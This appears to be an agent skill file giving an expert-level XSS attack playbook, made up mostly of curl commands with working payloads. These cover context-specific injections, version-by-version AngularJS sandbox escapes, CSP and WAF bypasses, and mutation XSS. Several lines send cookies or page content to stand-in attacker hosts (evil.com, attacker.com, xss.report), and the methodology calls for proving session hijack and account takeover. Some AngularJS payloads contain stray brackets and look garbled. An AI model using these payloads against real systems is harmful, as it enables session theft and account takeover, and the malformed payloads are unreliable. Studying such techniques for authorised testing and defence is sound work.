---
name: xss
description: XSS testing covering reflected, stored, and DOM-based vectors with AngularJS sandbox escapes, CSP bypasses, and advanced exploitation techniques
---

# XSS — Expert-Level Testing Methodology

Cross-site scripting persists because context, parser, and framework edges are complex. This skill covers standard XSS AND advanced exploitation: AngularJS sandbox escapes, CSP bypasses, mutation XSS, and exploit chaining.

## Attack Surface

**Types**: Reflected, stored, DOM-based, self-XSS (chainable), blind XSS, mutation XSS (mXSS)
**Contexts**: HTML body, attribute (quoted/unquoted), URL, JavaScript string/template, CSS, SVG/MathML, Markdown, PDF, JSON response, XML/XHTML
**Frameworks**: React/Vue/Angular/AngularJS/Svelte sinks, template engines (Jinja/EJS/Handlebars/Pug), SSR/ISR
**Defenses**: CSP, Trusted Types, DOMPurify, WAF, framework auto-escaping, input validation

## Step 1: Identify Reflection Context

Before ANY payload testing, determine WHERE your input is reflected:

```bash
# 1. Send a unique canary string and find where it appears
curl -sk "https://TARGET/search?q=xalg0r1x7357" | grep -n "xalg0r1x7357"

# 2. Determine the exact context from the HTML
# HTML body:      <div>xalg0r1x7357</div>                → use <img/svg payloads
# Attribute:      <input value="xalg0r1x7357">            → break out with " then event handler
# JS string:      var x = "xalg0r1x7357";                 → break string with "- or '-
# JS template:    `Hello ${xalg0r1x7357}`                 → inject ${} expression
# URL:            <a href="...xalg0r1x7357">              → javascript: protocol
# CSS:            style="color: xalg0r1x7357"             → expression() or url()
# Comment:        <!-- xalg0r1x7357 -->                    → close comment -->

# 3. Check what characters are encoded/filtered
curl -sk "https://TARGET/search?q=<>\"'(){}[];:/\\%0a%0d" | grep -c "<"
# Compare input vs output to see what survives
```

## Step 2: Test By Context

### HTML Body Context

```bash
# Basic payloads — try these FIRST
curl -sk "https://TARGET/page?q=<img+src=x+onerror=alert(1)>"
curl -sk "https://TARGET/page?q=<svg+onload=alert(1)>"
curl -sk "https://TARGET/page?q=<body+onload=alert(1)>"
curl -sk "https://TARGET/page?q=<details+open+ontoggle=alert(1)>"

# If < and > pass but <script> is blocked
curl -sk "https://TARGET/page?q=<img/src=x+onerror=alert(1)>"
curl -sk "https://TARGET/page?q=<svg/onload=alert(1)>"
curl -sk "https://TARGET/page?q=<input+autofocus+onfocus=alert(1)>"
curl -sk "https://TARGET/page?q=<marquee+onstart=alert(1)>"
curl -sk "https://TARGET/page?q=<video+src=x+onerror=alert(1)>"
curl -sk "https://TARGET/page?q=<audio+src=x+onerror=alert(1)>"

# If event handlers (on*) are blocked — use alternative triggers
curl -sk "https://TARGET/page?q=<a+href=javascript:alert(1)>click</a>"
curl -sk "https://TARGET/page?q=<form+action=javascript:alert(1)><input+type=submit>"
curl -sk "https://TARGET/page?q=<math><mtext><table><mglyph><style><!--</style><img+src+onerror=alert(1)>"

# If alphanumeric filters — encoded payloads
curl -sk "https://TARGET/page?q=<svg/onload=alert%26%2340%3B1%26%2341%3B>"
```

### Attribute Context

```bash
# Double-quoted attribute: <input value="INJECTION">
curl -sk 'https://TARGET/page?q="+autofocus+onfocus=alert(1)+x="'
curl -sk 'https://TARGET/page?q="+onmouseover=alert(1)+"'
curl -sk 'https://TARGET/page?q="><img+src=x+onerror=alert(1)>'

# Single-quoted attribute: <input value='INJECTION'>
curl -sk "https://TARGET/page?q='+autofocus+onfocus=alert(1)+x='"
curl -sk "https://TARGET/page?q='><img+src=x+onerror=alert(1)>"

# Unquoted attribute: <input value=INJECTION>
curl -sk "https://TARGET/page?q=x+autofocus+onfocus=alert(1)"

# href/src attribute: <a href="INJECTION">
curl -sk "https://TARGET/page?url=javascript:alert(1)"
curl -sk "https://TARGET/page?url=javascript:alert(document.domain)"
curl -sk "https://TARGET/page?url=data:text/html,<script>alert(1)</script>"

# If quotes are HTML-encoded but angle brackets pass
curl -sk "https://TARGET/page?q=><svg+onload=alert(1)>"
```

### JavaScript String Context

```bash
# var x = "INJECTION";
curl -sk 'https://TARGET/page?q="-alert(1)-"'
curl -sk 'https://TARGET/page?q=";alert(1)//'
curl -sk "https://TARGET/page?q='-alert(1)-'"
curl -sk "https://TARGET/page?q=';alert(1)//"
curl -sk "https://TARGET/page?q=\";alert(1)//"

# Template literal: `Hello ${INJECTION}`
curl -sk 'https://TARGET/page?q=${alert(1)}'
curl -sk 'https://TARGET/page?q=${constructor.constructor("alert(1)")()}'

# If backslash is not escaped but quotes are
curl -sk "https://TARGET/page?q=\\';alert(1)//"

# If inside JSON response reflected in HTML
curl -sk 'https://TARGET/api?callback=alert(1)//'
```

## Step 3: AngularJS Sandbox Escape (CRITICAL for Expert-Level)

If the target uses AngularJS (check for `ng-app` or `angular.js` in page source), these are the sandbox escape payloads **by version**:

### Detection

```bash
# Detect AngularJS and version
curl -sk "https://TARGET/" | grep -oP 'angular[^"]*\.js[^"]*'
curl -sk "https://TARGET/" | grep -oP 'ng-app|ng-controller|ng-bind|ng-model|\{\{.*\}\}'

# Quick test — if {{7*7}} returns 49, Angular expression injection exists
curl -sk "https://TARGET/search?q={{7*7}}" | grep "49"

# Test with constructor access
curl -sk "https://TARGET/search?q={{constructor.constructor('return+1')()}}" | grep "1"
```

### AngularJS 1.0.x - 1.1.x Sandbox Escapes

```bash
# No sandbox in these versions — direct eval
curl -sk "https://TARGET/page?q={{constructor.constructor('alert(1)')()}}"
```

### AngularJS 1.2.x Sandbox Escapes

```bash
# 1.2.0 - 1.2.18
curl -sk "https://TARGET/page?q={{a]='alert(1)'}}{{a.constructor.prototype.charAt=[].join;a|orderBy:'x]|[x'}}"

# 1.2.19 - 1.2.23
curl -sk "https://TARGET/page?q={{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"

# 1.2.24 - 1.2.29
curl -sk "https://TARGET/page?q={{'a'.constructor.prototype.charAt=[].join;$eval('x=1}};alert(1)//');}}}"
```

### AngularJS 1.3.x Sandbox Escapes

```bash
# 1.3.0
curl -sk "https://TARGET/page?q={{!ready&&(ready=true)&&(!!constructor.defineProperty(this,'__proto__',{value:{charAt:[].join,indexOf:[].indexOf,charCodeAt:[].concat},writable:true,configurable:true}))&&(x]||(x]=1,alert(1)))&&(a]='1')}}"

# 1.3.1 - 1.3.2
curl -sk "https://TARGET/page?q={{a]='x]=%27.teleport(x.document.location.href]=%27http://evil/?%27+document.cookie)';b=c.constructor.prototype;b.charAt=b.trim;$eval(a])}}"

# 1.3.3 - 1.3.18
curl -sk "https://TARGET/page?q={{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a]'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)//');}}}"

# 1.3.19 - 1.3.20 (WITHOUT STRINGS — key technique!)
curl -sk "https://TARGET/page?q={{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}"
```

### AngularJS 1.4.x Sandbox Escapes

```bash
# 1.4.0 - 1.4.9
curl -sk "https://TARGET/page?q={{'a'.constructor.prototype.charAt=[].join;$eval('x=alert⑴');}}"

# Alternative 1.4.x
curl -sk "https://TARGET/page?q={{x={'y':''.constructor.prototype};x.y.charAt=[].join;$eval('x=alert(1)');}}"
```

### AngularJS 1.5.x Sandbox Escapes

```bash
# 1.5.0 - 1.5.7
curl -sk "https://TARGET/page?q={{x=valueOf.call;x(alert,1)}}"

# 1.5.8 - 1.5.11
curl -sk "https://TARGET/page?q={{a]constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"
```

### AngularJS 1.6+ (Sandbox Removed — Direct Expression Injection)

```bash
# 1.6.0+ — sandbox was REMOVED, so direct constructor access works
curl -sk "https://TARGET/page?q={{constructor.constructor('alert(1)')()}}"
curl -sk "https://TARGET/page?q={{$on.constructor('alert(1)')()}}"

# Without parentheses (if blocked)
curl -sk "https://TARGET/page?q={{$on.constructor('alert(1)').__proto__.constructor('alert(1)')()}}"

# Using toString
curl -sk "https://TARGET/page?q={{'a].__proto__.constructor('alert(1])')()}}"

# Without strings (using String.fromCharCode)
curl -sk "https://TARGET/page?q={{$on.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}"
```

### AngularJS Sandbox Escape WITHOUT Strings (All Versions)

This is critical when WAF/CSP blocks quotes:

```bash
# Using fromCharCode to avoid string literals
curl -sk "https://TARGET/page?q={{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}"

# Using array join to construct strings
curl -sk "https://TARGET/page?q={{'a].__proto__.constructor([97,108,101,114,116,40,49,41].map(x=>String.fromCharCode(x)).join([]))()}}"

# Using charAt override technique
curl -sk "https://TARGET/page?q={{x=toString().constructor;x.prototype.charAt=[].join;x.fromCharCode(120,61,97,108,101,114,116,40,49,41)|orderBy:0}}"
```

## Step 4: CSP Bypass Techniques

### Audit the CSP First

```bash
# Get the CSP header
curl -sI "https://TARGET/" | grep -i "content-security-policy"

# Common weak patterns that allow bypass:
# script-src 'unsafe-inline'           → any inline script works
# script-src 'unsafe-eval'             → eval/Function/setTimeout work
# script-src *.google.com              → use Google JSONP/Angular CDN
# script-src *.googleapis.com          → load angular.js from CDN
# script-src 'nonce-xxx'               → find nonce reuse or injection
# script-src 'self'                    → upload a .js file or find JSONP on same origin
# default-src 'none' without script-src → scripts allowed (CSP spec quirk)
# base-uri missing                     → inject <base> to hijack relative scripts
```

### CSP Bypass: Using Allowed CDNs

```bash
# If *.googleapis.com or *.google.com is allowed
curl -sk "https://TARGET/page?q=<script+src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script><div+ng-app>{{constructor.constructor('alert(1)')()}}</div>"

# If *.cloudflare.com is allowed
curl -sk "https://TARGET/page?q=<script+src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js></script><div+ng-app>{{constructor.constructor('alert(1)')()}}</div>"

# If 'self' — find JSONP endpoints on same origin
curl -sk "https://TARGET/api/jsonp?callback=alert(1)//"
curl -sk "https://TARGET/page?q=<script+src=/api/jsonp?callback=alert(1)//></script>"
```

### CSP Bypass: Base Tag Injection

```bash
# If base-uri not restricted in CSP
# Inject <base href="https://attacker.com/"> to redirect relative script loads
curl -sk "https://TARGET/page?q=<base+href=https://attacker.com/>"
# Then host a matching .js file on attacker.com that matches the relative paths
```

### CSP Bypass: Using Script Gadgets

```bash
# Script gadgets — legitimate library functions that execute attacker-controlled content

# jQuery — if jQuery is loaded and CSP allows 'unsafe-eval' or has JSONP
curl -sk "https://TARGET/page?q=<div+data-role=popup+id='--><script>alert(1)</script>'></div>"

# Angular + script gadget (CSP with script-src 'self' but angular loaded)
curl -sk "https://TARGET/page?q=<input+ng-focus=$event.composedPath()|orderBy:'[].constructor.from([1],alert)'>"

# Require.js gadget
curl -sk "https://TARGET/page?q=<script+data-main='data:,alert(1)'></script>"

# Google closure library
curl -sk "https://TARGET/page?q=<script+src=//www.google.com/jsapi?callback=alert></script>"
```

### CSP Bypass: With AngularJS + CSP-Specific Event Handlers

```bash
# AngularJS events that work WITH strict CSP (no 'unsafe-eval' needed)
# These use ng-focus, ng-click etc. which bypasses CSP because Angular handles them

# CRITICAL: This is the combination for "Reflected XSS with AngularJS sandbox escape and CSP"
curl -sk "https://TARGET/page?q=<input+id=x+ng-focus=$event.composedPath()|orderBy:'[].constructor.from([1],alert)'>"

# Auto-triggering (no user interaction)
curl -sk "https://TARGET/page?q=<input+autofocus+ng-focus=$event.composedPath()|orderBy:'[].constructor.from([1],alert)'>"

# Alternative: using $event.view
curl -sk "https://TARGET/page?q=<input+autofocus+ng-focus=$event.view.alert(1)>"

# If $event is blocked
curl -sk "https://TARGET/page?q=<div+ng-app+ng-csp><input+autofocus+ng-focus=$event.composedPath()|orderBy:'[].constructor.from([1],alert)'></div>"

# Using ng-click with tabindex for focus
curl -sk "https://TARGET/page?q=<div+ng-app+ng-csp+tabindex=0+ng-focus=$event.composedPath()|orderBy:'[].constructor.from([1],alert)'>click</div>"
```

### CSP Bypass: Dangling Markup

```bash
# If CSP blocks scripts but not other elements
# Exfiltrate page content via dangling markup attack
curl -sk "https://TARGET/page?q=<img+src='https://attacker.com/steal?"
# This leaves an unclosed attribute that captures everything until the next quote
```

## Step 5: Advanced Bypass Techniques

### WAF Bypass Encoding Chains

```bash
# Double URL encoding
curl -sk "https://TARGET/page?q=%253Csvg%2520onload%253Dalert(1)%253E"

# HTML entity encoding
curl -sk "https://TARGET/page?q=<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"

# Mixed encoding
curl -sk "https://TARGET/page?q=<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>"

# Null byte injection (older parsers)
curl -sk "https://TARGET/page?q=<scr%00ipt>alert(1)</script>"

# Tab/newline in tag name
curl -sk "https://TARGET/page?q=<svg%09onload=alert(1)>"
curl -sk "https://TARGET/page?q=<svg%0aonload=alert(1)>"
curl -sk "https://TARGET/page?q=<svg%0donload=alert(1)>"

# JavaScript protocol with encoding
curl -sk "https://TARGET/page?url=java%0ascript:alert(1)"
curl -sk "https://TARGET/page?url=j%0Aava%09script:alert(1)"
curl -sk "https://TARGET/page?url=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"
```

### Mutation XSS (mXSS) — Bypasses DOMPurify and Server-Side Sanitizers

```html
<!-- These exploit browser HTML parser mutations -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<math><mtext><img src=x onerror=alert(1)>
<svg><style><img src=x onerror=alert(1)></style></svg>
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

### Event Handler Alternatives (When Standard on* Is Blocked)

```bash
# SVG-specific events
curl -sk "https://TARGET/page?q=<svg><animate+onbegin=alert(1)+attributeName=x+dur=1s>"
curl -sk "https://TARGET/page?q=<svg><set+onbegin=alert(1)+attributename=x+to=1>"

# SMIL animation events
curl -sk "https://TARGET/page?q=<svg><animate+onend=alert(1)+attributeName=x+dur=0.001s+from=0+to=1>"

# focus-based (auto-trigger)
curl -sk "https://TARGET/page?q=<input+onfocus=alert(1)+autofocus>"
curl -sk "https://TARGET/page?q=<select+autofocus+onfocus=alert(1)>"
curl -sk "https://TARGET/page?q=<textarea+autofocus+onfocus=alert(1)>"
curl -sk "https://TARGET/page?q=<keygen+autofocus+onfocus=alert(1)>"

# details/summary (no interaction needed)
curl -sk "https://TARGET/page?q=<details+open+ontoggle=alert(1)>"

# marquee (deprecated but works)
curl -sk "https://TARGET/page?q=<marquee+onstart=alert(1)>"

# body onhashchange
curl -sk "https://TARGET/page?q=<body+onhashchange=alert(1)>#x"
```

## Step 6: Framework-Specific Exploitation

### React

```bash
# dangerouslySetInnerHTML — if user input reaches this sink
# Look for: dangerouslySetInnerHTML={{__html: userInput}}
# Standard HTML payloads work inside this sink

# React SSR hydration mismatch
# If server renders user input safely but client re-renders unsafely
# Test by comparing server HTML vs client DOM
```

### Vue.js

```bash
# v-html directive
curl -sk "https://TARGET/page?q=<img src=x onerror=alert(1)>"

# Client-side template injection in Vue 2
curl -sk "https://TARGET/page?q={{constructor.constructor('alert(1)')()}}"

# Vue 3 with v-html + user input
curl -sk "https://TARGET/page?q=<img+src=x+onerror='fetch(`//evil.com?c=`+document.cookie)'>"
```

### AngularJS (Legacy — Pre Angular 2)

See Step 3 above for version-specific sandbox escapes.

### Angular (2+)

```bash
# Angular 2+ has MUCH stronger protection
# Sinks: [innerHTML] binding with bypassSecurityTrustHtml
# If developer used DomSanitizer.bypassSecurityTrustHtml:
curl -sk "https://TARGET/page?q=<img+src=x+onerror=alert(1)>"

# Template injection is NOT possible in Angular 2+ (AOT compilation)
# Focus on DOM manipulation via [innerHTML] and server-side rendering sinks
```

## Testing Methodology

1. **Identify reflection** — Send canary string, find WHERE it appears (HTML/attr/JS/URL)
2. **Classify context** — Determine exact injection context and what characters survive
3. **Detect framework** — Check for AngularJS (ng-app, angular.js), React, Vue, jQuery
4. **Audit CSP** — Read Content-Security-Policy header, identify weak directives
5. **Craft context-specific payloads** — Use the exact payloads from this skill for the detected context
6. **If AngularJS detected** — Determine version, use version-specific sandbox escape
7. **If CSP present** — Use CSP bypass techniques (CDN abuse, script gadgets, base tag)
8. **Encode and bypass** — Apply encoding chains if WAF blocks payloads
9. **Test mXSS** — If sanitizer present, try mutation XSS payloads
10. **Demonstrate impact** — Chain with cookie theft, session hijacking, or CSRF

## Validation

1. JavaScript executes in browser context (alert, console.log, or callback to attacker server)
2. Payload works without modification in fresh browser session
3. CSP bypass is demonstrated (if CSP present, show violation is not triggered)
4. Impact quantified: cookie theft, session hijack, account takeover PoC

## False Positives

- Input reflected but fully HTML-encoded in the correct context
- CSP with strict nonces/hashes blocking all inline execution
- Trusted Types enforced and no vulnerable policies
- Framework auto-escaping working correctly (React JSX, Angular template binding)

## Impact

- **Critical**: Stored XSS with admin session hijack → account takeover
- **High**: Reflected XSS with CSP bypass → credential theft
- **High**: DOM XSS in authentication flow → session token theft
- **Medium**: Reflected XSS without CSP bypass (requires user interaction)
- **Low**: Self-XSS (not exploitable without social engineering)

## Pro Tips

1. **Context first, payload second** — Never brute-force payloads. Identify the context, THEN craft the right payload.
2. **AngularJS sandbox escapes change by version** — Always determine the exact version before attempting escapes.
3. **CSP bypass via CDN** — If googleapis.com or cdnjs.cloudflare.com is whitelisted, you can load AngularJS and get code execution.
4. **`$event.composedPath()|orderBy:'[].constructor.from([1],alert)'`** is the most reliable CSP-compatible AngularJS payload in 2024+.
5. **Mutation XSS bypasses ALL sanitizers** — including DOMPurify. Test `<math><mtext>` and `<noscript>` constructions.
6. **Event handlers without parentheses**: Use backticks `` alert`1` `` when `()` is blocked.
7. **String-free payloads**: Use `String.fromCharCode()` or `[].constructor.from()` when quotes are blocked.
8. **If `alert` is blocked**: Use `print()`, `confirm()`, `prompt()`, or `fetch('//attacker.com')`.
9. **href/src sinks**: Always test `javascript:` protocol — even modern frameworks sometimes miss this.
10. **For blind XSS**: Use `<script src=https://xss.report/s/YOUR_ID></script>` or custom callback payloads.
